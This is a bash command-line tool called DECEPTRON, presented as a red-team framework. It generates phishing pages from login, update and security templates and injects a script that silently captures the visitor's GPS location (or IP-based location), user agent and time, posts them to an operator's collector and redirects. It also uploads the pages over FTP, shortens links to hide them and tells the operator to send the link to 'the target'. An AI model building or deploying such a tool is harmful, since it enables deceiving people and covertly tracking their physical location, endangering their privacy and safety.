#!/bin/bash
# DECEPTRON Main CLI
# Created by: anonymous-beta | https://github.com/anonymous-beta

VERSION="1.0"
CONFIG="config.json"
DB_PATH=$(python3 -c "import json; print(json.load(open('$CONFIG')).get('db_path','db/hits.db'))" 2>/dev/null || echo "db/hits.db")

banner() {
    echo ""
    echo "    ██████╗ ███████╗ ██████╗███████╗██████╗ ████████╗ ██████╗ ███╗   ██╗"
    echo "    ██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗╚══██╔══╝██╔═══██╗████╗  ██║"
    echo "    ██║  ██║█████╗  ██║     █████╗  ██████╔╝   ██║   ██║   ██║██╔██╗ ██║"
    echo "    ██║  ██║██╔══╝  ██║     ██╔══╝  ██╔══██╗   ██║   ██║   ██║██║╚██╗██║"
    echo "    ██████╔╝███████╗╚██████╗███████╗██║  ██║   ██║   ╚██████╔╝██║ ╚████║"
    echo "    ╚═════╝ ╚══════╝ ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝"
    echo "    v${VERSION} — Red Team Geospatial Intelligence Framework"
    echo "    Created by: anonymous-beta | https://github.com/anonymous-beta"
    echo ""
}

help_menu() {
    banner
    echo "Usage: ./deceptron.sh <command>"
    echo ""
    echo "Commands:"
    echo "  setup       — Initialize environment and database"
    echo "  server      — Start collector + dashboard server"
    echo "  generate    — Create and deploy a phishing campaign"
    echo "  list        — List active campaigns"
    echo "  dashboard   — Open dashboard URL"
    echo "  export      — Export data (csv/json)"
    echo "  shorten     — Obfuscate a tracking link"
    echo "  status      — Show server status"
    echo "  help        — Show this menu"
    echo ""
}

cmd_setup() {
    bash setup.sh
}

cmd_server() {
    banner
    echo "[+] Starting DECEPTRON Collector + Dashboard..."
    python3 server.py &
    SERVER_PID=$!
    echo $SERVER_PID > .deceptron.pid
    echo "[+] Server PID: $SERVER_PID"
    echo "[+] Dashboard: http://localhost:5000"
    echo "[+] Collector: http://localhost:5000/log"
    echo "[+] Press Ctrl+C to stop"
    wait $SERVER_PID
}

cmd_generate() {
    banner
    python3 - << 'PYEOF'
import json, os, uuid, sys, ftplib

cfg = json.load(open('config.json'))
db_path = cfg.get('db_path', 'db/hits.db')

campaign = input("[?] Campaign name (alphanumeric): ").strip()
if not campaign or not campaign.replace('_','').isalnum():
    print("[!] Invalid campaign name"); sys.exit(1)

template = input("[?] Template type (login/update/security/custom): ").strip().lower()
if template not in ('login','update','security','custom'):
    print("[!] Invalid template"); sys.exit(1)

redirect = input("[?] Redirect URL (leave blank for none): ").strip()
if not redirect:
    redirect = "https://www.google.com"

base_url = cfg.get('base_url','')
if not base_url:
    print("[!] base_url not set in config.json"); sys.exit(1)

collector = cfg.get('collector_url','')
if not collector:
    collector = f"http://{cfg.get('server_host','0.0.0.0')}:{cfg.get('server_port',5000)}/log"

session_id = uuid.uuid4().hex[:8]
tracking_link = f"{base_url}/{campaign}?id={session_id}"

# Build HTML
templates_dir = "templates"
if template == 'custom':
    custom_html = input("[?] Paste custom HTML (or press enter for blank): ").strip()
    if not custom_html:
        custom_html = "<h1>Loading...</h1>"
    html_body = custom_html
else:
    with open(f"{templates_dir}/{template}.html", "r") as f:
        html_body = f.read()

# Inject tracker script
tracker_script = f"""
<script>
(function(){{
    const collector = "{collector}";
    const campaign = "{campaign}";
    const session = "{session_id}";
    const redirect = "{redirect}";
    
    function sendData(lat, lng, acc, source){{
        fetch(collector, {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{
                id: campaign,
                session: session,
                lat: lat,
                lng: lng,
                acc: acc,
                ua: navigator.userAgent,
                ts: Math.floor(Date.now()/1000),
                ip: '',
                source: source
            }})
        }}).then(()=>{{
            window.location.href = redirect;
        }}).catch(()=>{{
            window.location.href = redirect;
        }});
    }}
    
    if(navigator.geolocation){{
        navigator.geolocation.getCurrentPosition(
            (pos)=>{{
                sendData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'gps');
            }},
            (err)=>{{
                // Fallback: IP geolocation via ipapi
                fetch('https://ipapi.co/json/')
                .then(r=>r.json())
                .then(data=>{{
                    sendData(data.latitude||0, data.longitude||0, 5000, 'ip');
                }})
                .catch(()=>{{
                    sendData(0,0,99999,'unknown');
                }});
            }},
            {{enableHighAccuracy:true, timeout:10000, maximumAge:0}}
        );
    }} else {{
        fetch('https://ipapi.co/json/')
        .then(r=>r.json())
        .then(data=>{{
            sendData(data.latitude||0, data.longitude||0, 5000, 'ip');
        }})
        .catch(()=>{{
            sendData(0,0,99999,'unknown');
        }});
    }}
}})();
</script>
"""

# Insert script before </body> or append
if "</body>" in html_body:
    html_body = html_body.replace("</body>", tracker_script + "\n</body>")
else:
    html_body += tracker_script

# Save generated
out_dir = f"generated/{campaign}"
os.makedirs(out_dir, exist_ok=True)
out_path = f"{out_dir}/index.html"
with open(out_path, "w") as f:
    f.write(html_body)

print(f"[+] Generated: {out_path}")

# Upload via FTP if configured
ftp_host = cfg.get('ftp_host','')
if ftp_host:
    try:
        ftp = ftplib.FTP(ftp_host)
        ftp.login(cfg.get('ftp_user',''), cfg.get('ftp_pass',''))
        ftp.cwd(cfg.get('ftp_path','/public_html'))
        
        # Create campaign dir
        try:
            ftp.mkd(campaign)
        except:
            pass
        ftp.cwd(campaign)
        
        with open(out_path, 'rb') as f:
            ftp.storbinary(f'STOR index.html', f)
        ftp.quit()
        print(f"[+] Uploaded to: {base_url}/{campaign}")
    except Exception as e:
        print(f"[!] FTP upload failed: {e}")
        print(f"[!] Manual upload required: {out_path}")
else:
    print(f"[!] No FTP config. Manual upload: {out_path}")

# Store in DB
import sqlite3
conn = sqlite3.connect(db_path)
c = conn.cursor()
c.execute("INSERT OR REPLACE INTO campaigns (name, template_type, redirect_url, link) VALUES (?,?,?,?)",
          (campaign, template, redirect, tracking_link))
conn.commit()
conn.close()

print(f"[+] Tracking link: {tracking_link}")
print(f"[+] Send this to the target.")
PYEOF
}

cmd_list() {
    python3 -c "
import sqlite3, json
db = json.load(open('config.json')).get('db_path','db/hits.db')
conn = sqlite3.connect(db)
c = conn.cursor()
c.execute('SELECT name, template_type, link, created_at FROM campaigns ORDER BY created_at DESC')
rows = c.fetchall()
print(f'{\"Campaign\":<20} {\"Type\":<10} {\"Link\":<40} {\"Created\"}')
print('-'*90)
for r in rows:
    print(f'{r[0]:<20} {r[1]:<10} {r[2]:<40} {r[3]}')
conn.close()
"
}

cmd_dashboard() {
    echo "[+] Dashboard: http://localhost:5000"
    command -v xdg-open >/dev/null && xdg-open http://localhost:5000
    command -v termux-open >/dev/null && termux-open http://localhost:5000
}

cmd_export() {
    fmt=${2:-json}
    python3 -c "
import sqlite3, json, csv, sys
db = json.load(open('config.json')).get('db_path','db/hits.db')
conn = sqlite3.connect(db)
c = conn.cursor()
c.execute('SELECT * FROM hits ORDER BY timestamp DESC')
rows = c.fetchall()
cols = [d[0] for d in c.description]

if '$fmt' == 'json':
    data = [dict(zip(cols, r)) for r in rows]
    with open('export.json','w') as f:
        json.dump(data, f, indent=2)
    print('[+] Exported: export.json')
else:
    with open('export.csv','w', newline='') as f:
        w = csv.writer(f)
        w.writerow(cols)
        w.writerows(rows)
    print('[+] Exported: export.csv')
conn.close()
"
}

cmd_shorten() {
    url=$2
    if [ -z "$url" ]; then
        read -p "[?] URL to shorten: " url
    fi
    short=$(curl -s "https://tinyurl.com/api-create.php?url=$url")
    echo "[+] Short link: $short"
}

cmd_status() {
    if [ -f .deceptron.pid ]; then
        pid=$(cat .deceptron.pid)
        if ps -p "$pid" > /dev/null 2>&1; then
            echo "[+] Server running (PID: $pid)"
            echo "[+] Dashboard: http://localhost:5000"
        else
            echo "[!] Server not running (stale PID file)"
            rm -f .deceptron.pid
        fi
    else
        echo "[!] Server not running"
    fi
}

# Main
case "$1" in
    setup) cmd_setup ;;
    server) cmd_server ;;
    generate) cmd_generate ;;
    list) cmd_list ;;
    dashboard) cmd_dashboard ;;
    export) cmd_export "$@" ;;
    shorten) cmd_shorten "$@" ;;
    status) cmd_status ;;
    *) help_menu ;;
esac
